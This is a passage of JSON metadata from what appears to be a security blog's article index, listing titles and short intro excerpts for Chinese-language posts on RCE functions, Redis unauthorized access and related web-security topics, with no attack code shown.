注入​\t\t文件读写函数​\t\tudf提权","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"RCE函数总结","slug":"rce_conclude","date":"2021-02-27T10:10:29.000Z","updated":"2021-02-27T14:38:20.186Z","comments":true,"path":"api/articles/rce_conclude.json","excerpt":"<p>最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新）</p>","keywords":null,"cover":"../static/images/image-20210227220806587.png","content":null,"text":"最近由于面试，被面试官提到了无法回答的关于命令执行的问题，遂写此文总结各语言RCE时所碰到的函数和相关的知识点，查漏补缺，也方便自己以后使用到的时候可以快速使用。（后续可能根据积累持续更新） NodeJsnodejs的几个可用命令执行函数：child_process.spawn1","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]},{"title":"Redis未授权访问","slug":"redis未授权访问","date":"2021-02-22T16:04:48.000Z","updated":"2021-02-26T02:36:00.724Z","comments":true,"path":"api/articles/redis未授权访问.json","excerpt":"<h1 id=\"nginxphpredis环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#nginxphpredis环境搭建\"></a> Nginx+PHP+Redis环境搭建</h1>\n<p>环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）</p>","keywords":null,"cover":"https://blog.b0ring.cf/static/images/image-20210223223810960.png","content":null,"text":" Nginx+PHP+Redis环境搭建环境搭建于arch，利用aur搭建的所以比较方便，系统不一样的请自行修改搭建步骤（也不难，这里记录下只是为了给下次省时间，其实主要还是改配置文件费时间，不同系统一样的）Nginx环境搭建：1<br>yay -S nginx<br>修改配置文","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"web","slug":"web","count":5,"path":"api/tags/web.json"}]}]}